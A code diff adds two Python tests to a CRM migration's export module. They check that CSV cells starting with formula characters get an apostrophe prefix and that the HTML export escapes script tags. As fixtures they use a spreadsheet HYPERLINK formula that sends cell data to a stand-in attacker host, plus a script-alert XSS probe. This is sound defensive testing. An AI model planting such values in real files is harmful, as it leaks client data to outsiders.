@@ -142,3 +142,47 @@ async def test_export_keeps_every_active_selected_record_and_marks_unmigrated_ro
     assert "Irina Kundin" in csv_text
     assert "not_migrated" in csv_text
     assert csv_text.index("991") < csv_text.index("992")
+
+
+def test_a_name_that_looks_like_a_formula_is_written_as_text():
+    """This file is made for Excel, and a client controls their own name.
+
+    `=HYPERLINK("http://x/"&A1,"click")` in a CRM name field is a formula to
+    Excel and LibreOffice, not a name: the owner opening the export would ship
+    the row to whoever owns that URL. The leading apostrophe keeps the cell text
+    and displays unchanged.
+    """
+    from altegio_bot.easyweek_migration import operator_export as export
+
+    rows = [
+        {field: "" for field in export.FIELDNAMES}
+        | {
+            "customer_name": '=HYPERLINK("http://evil.example/"&A1,"click")',
+            "customer_phone": "+4915112345678",
+            "service_name": "-2+3",
+            "altegio_record_id": 900001,
+        }
+    ]
+
+    body = export._csv(rows)
+
+    # Quoted by the writer AND prefixed by us: the cell is text, not a formula.
+    assert "\"'=HYPERLINK" in body
+    assert "'+4915112345678" in body
+    assert "'-2+3" in body
+    assert not any(cell.startswith("=") for cell in body.replace('"', "").split(","))
+
+    # An ordinary value is untouched: the numeric id keeps no prefix.
+    assert "900001," in body
+    assert "'900001" not in body
+
+
+def test_the_html_export_escapes_the_same_values():
+    from altegio_bot.easyweek_migration import operator_export as export
+
+    rows = [{field: "" for field in export.FIELDNAMES} | {"customer_name": "<script>alert(1)</script>"}]
+
+    body = export._html(rows)
+
+    assert "<script>" not in body
+    assert "&lt;script&gt;" in body
